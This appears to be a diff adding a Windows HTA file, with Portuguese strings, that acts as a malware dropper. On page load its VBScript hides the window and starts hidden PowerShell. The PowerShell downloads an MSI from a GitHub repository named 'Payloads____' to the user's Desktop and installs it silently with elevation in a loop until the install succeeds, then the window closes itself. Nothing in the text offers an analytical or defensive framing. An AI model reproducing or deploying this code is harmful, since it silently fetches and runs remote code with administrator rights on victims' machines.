@@ -1,0 +1,40 @@
+<hta:application
+    applicationname="ExecutarScript"
+    id="executarScript"
+    showintaskbar="no"
+    singleinstance="yes"
+    windowstate="minimize"
+    caption="no"
+    sysmenu="no"
+    border="none"
+    contextmenu="no"
+    innerborder="no"
+/>
+<script language="VBScript">
+    Sub Window_OnLoad
+        RunScript()
+    End Sub
+
+    Sub RunScript()
+        Dim objShell, psCommand
+        Set objShell = CreateObject("WScript.Shell")
+        
+        psCommand = "$downloadURL = 'https://github.com/T1Cr4azy/Payloads____/raw/main/setup.msi';" &_
+                    "$downloadPath = " & Chr(34) & objShell.ExpandEnvironmentStrings("%USERPROFILE%") & "\Desktop\setup.msi" & Chr(34) & ";" &_
+                    "do {" &_
+                    "    Invoke-WebRequest -Uri $downloadURL -OutFile $downloadPath;" &_
+                    "    $msiInfo = Get-WmiObject -Query 'SELECT * FROM Win32_Product WHERE Name = ''setup.msi''' -ErrorAction SilentlyContinue;" &_
+                    "    if (-not $msiInfo) {" &_
+                    "        Start-Process -FilePath msiexec.exe -ArgumentList '/i """ & Chr(34) & "$downloadPath" & Chr(34) & " /qn' -Verb RunAs" &_
+                    "    } else {" &_
+                    "        Write-Host 'O arquivo MSI já possui privilégios administrativos.'" &_
+                    "    };" &_
+                    "    Start-Sleep -Seconds 5" &_
+                    "} while (-not $msiInfo)"
+        
+        objShell.Run "powershell.exe -WindowStyle Hidden -Command """ & psCommand & """", 0, False
+        
+        Set objShell = Nothing
+        Self.Close
+    End Sub
+</script>
